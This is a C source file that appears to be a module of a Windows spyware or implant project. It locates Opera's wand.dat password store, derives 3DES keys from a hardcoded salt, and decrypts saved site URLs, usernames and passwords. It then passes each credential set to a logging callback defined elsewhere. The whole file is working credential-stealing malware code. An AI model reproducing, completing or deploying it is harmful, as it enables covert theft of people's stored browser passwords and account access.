#define _CRT_SECURE_NO_WARNINGS 1

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <crypto/md5.h>
#include <crypto/des.h>
#include "../../H4DLL/common.h"

const unsigned char opera_salt[11] = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };

struct p_entry {
	WCHAR service[64];
	WCHAR resource[255];
	WCHAR user_name[255];
	WCHAR user_value[255];
	WCHAR pass_name[255];
	WCHAR pass_value[255];
};

struct hash_opera {
	BYTE hashSignature1[MD5_DIGEST_LENGTH];
	BYTE hashSignature2[MD5_DIGEST_LENGTH];
	BYTE tmpBuffer[256];
};

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);

static WCHAR* GetOPProfilePath(WCHAR* FullPath, size_t size, const WCHAR* lpDirectory, const WCHAR* lpWandFile)
{
	WCHAR appPath[MAX_PATH];

	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);

	_snwprintf_s(FullPath, size, _TRUNCATE, L"%s\\%s\\%s", appPath, lpDirectory, lpWandFile);

	return FullPath;
}
// Function declarations..
static inline WCHAR* GetOPProfilePath(WCHAR *FullPath, size_t size, const WCHAR *lpWandFile)
{
	return GetOPProfilePath(FullPath, size, L"Opera\\Opera\\profile", lpWandFile);
}

static inline WCHAR* GetOPProfilePath11(WCHAR* FullPath, size_t size, const WCHAR* lpWandFile)
{
	return GetOPProfilePath(FullPath, size, L"Opera\\Opera", lpWandFile);
}

#ifndef SAFE_FREE
	#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
#endif

#define FORM_FIELDS 0x0c020000
BYTE* getFileContent(LPCWSTR lpFileName, LPDWORD FileSize)
{
	if (lpFileName == NULL)
		return NULL;

	HANDLE hFile;
	if ((hFile = FNC(CreateFileW)(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return 0;

	*FileSize = FNC(GetFileSize)(hFile, NULL);
	HANDLE hMap;
	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		return 0;
	}

	BYTE* wandMap = (BYTE*)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0);

	BYTE* ptr = (unsigned char*)malloc(*FileSize);

	if (wandMap != NULL && ptr != NULL)
		memcpy(ptr, wandMap, *FileSize);
	else
		*FileSize = 0;

	CloseHandle(hFile);
	FNC(UnmapViewOfFile)(wandMap);
	CloseHandle(hMap);
	return ptr;
}

static int DumpOP(WCHAR *wandPath)
{
	p_entry opentry;

	memset(&opentry, 0, sizeof(opentry));

	DWORD fileSize = 0;
	BYTE *wandData = getFileContent(wandPath, &fileSize);

	swprintf_s(opentry.service, 255, L"Opera");

	DWORD wandOffset = 0;
	int field_num = 0;

	//
	// main loop, find and process encrypted blocks
	//

	while(wandOffset < fileSize)
	{
		DWORD *field_type;

		// find key capacity field at start of block
		unsigned char *wandKey = (unsigned char *)
			memchr(wandData + wandOffset, DES_KEY_SZ, fileSize - wandOffset);

		if (wandKey == NULL)
			break;

		// Vede quando cominciano i field
		field_type = (DWORD *)(++wandKey);
		field_type-=3;

		wandOffset = wandKey - wandData;

		// create pointers to capacity fields
		unsigned char *blockLengthPtr = wandKey - 8;
		unsigned char *dataLengthPtr = wandKey + DES_KEY_SZ;

		if(blockLengthPtr < wandData || dataLengthPtr > wandData + fileSize)
			continue;

		// convert big-endian numbers to native
		unsigned long blockLength  = *blockLengthPtr++ << 24;
		blockLength |= *blockLengthPtr++ << 16;
		blockLength |= *blockLengthPtr++ <<  8;
		blockLength |= *blockLengthPtr;

		unsigned long dataLength  = *dataLengthPtr++ << 24;
		dataLength |= *dataLengthPtr++ << 16;
		dataLength |= *dataLengthPtr++ <<  8;
		dataLength |= *dataLengthPtr;

		// as discussed in the article
		if (blockLength != dataLength + DES_KEY_SZ + 4 + 4)
			continue;

		// perform basic sanity checks on data capacity
		if (dataLength > fileSize - (wandOffset + DES_KEY_SZ + 4) || dataLength < 8 || dataLength % 8 != 0)
			continue;

		struct hash_opera data;
		memset(&data, 0, sizeof(hash_opera));

		//
		// hashing of (salt, key), (hash, salt, key)
		//

		memcpy(data.tmpBuffer, opera_salt, sizeof(opera_salt));
		memcpy(data.tmpBuffer + sizeof(opera_salt), wandKey, DES_KEY_SZ);

		MD5(data.tmpBuffer, sizeof(opera_salt) + DES_KEY_SZ, data.hashSignature1);

		memcpy(data.tmpBuffer, data.hashSignature1, sizeof(data.hashSignature1));
		memcpy(data.tmpBuffer + sizeof(data.hashSignature1), opera_salt, sizeof(opera_salt));

		memcpy(data.tmpBuffer + sizeof(data.hashSignature1) + sizeof(opera_salt), wandKey, DES_KEY_SZ);

		MD5(data.tmpBuffer, sizeof(data.hashSignature1) + sizeof(opera_salt) + DES_KEY_SZ, data.hashSignature2);

		//
		// schedule keys. key material from hashes
		//
		DES_key_schedule key_schedule1, key_schedule2, key_schedule3;
		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature1[0], &key_schedule1);
		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature1[8], &key_schedule2);
		DES_set_key_unchecked((const_DES_cblock *)&data.hashSignature2[0], &key_schedule3);

		DES_cblock iVector;
		memcpy(iVector, &data.hashSignature2[8], sizeof(DES_cblock));

		unsigned char *cryptoData = wandKey + DES_KEY_SZ + 4;

		//
		// decrypt wand data in place using 3DES-CBC
		//
		DES_ede3_cbc_encrypt(cryptoData, cryptoData, dataLength, &key_schedule1, &key_schedule2, &key_schedule3, &iVector, 0);

		if (*cryptoData != 0x00 && *cryptoData != 0x08) {
			// remove padding (data padded up to next block)
			unsigned char *padding = cryptoData + dataLength - 1;
			memset(padding - (*padding - 1), 0x00, *padding);
			
			// se comincia con "http" e' un url, quindi contiamo il numero di
			// field che ci sono, il primo e' il nome, il secondo e' il valore

			if (field_num == 4) {
				field_num++;
				swprintf_s(opentry.pass_value, 255, L"%s", cryptoData);
				LogPassword(opentry.service, opentry.resource, opentry.user_value, opentry.pass_value);
			}
			if (field_num == 3) {
				// salta i dispari che sono i nome dei field
				field_num++;
			}
			if (field_num == 2) {
				field_num++;
				swprintf_s(opentry.user_value, 255, L"%s", cryptoData);
			}
			if (field_num == 1 && (*field_type) == FORM_FIELDS) {
				// salta i dispari che sono i nome dei field
				field_num++;
			}
			if (!wcsncmp((WCHAR *)cryptoData, L"http", 4)) {
				field_num = 1;
				swprintf_s(opentry.resource, 255, L"%s", cryptoData);
			}
		}

		wandOffset = wandOffset + DES_KEY_SZ + 4 + dataLength;
	}

	SAFE_FREE(wandData);

	return 1;
}

int DumpOpera(void)
{
	WCHAR ProfilePath[MAX_PATH] = {};

	GetOPProfilePath(ProfilePath, sizeof(ProfilePath), L"wand.dat");
	DumpOP(ProfilePath);
	GetOPProfilePath11(ProfilePath, sizeof(ProfilePath), L"wand.dat");
	DumpOP(ProfilePath);   

	return 0;
}
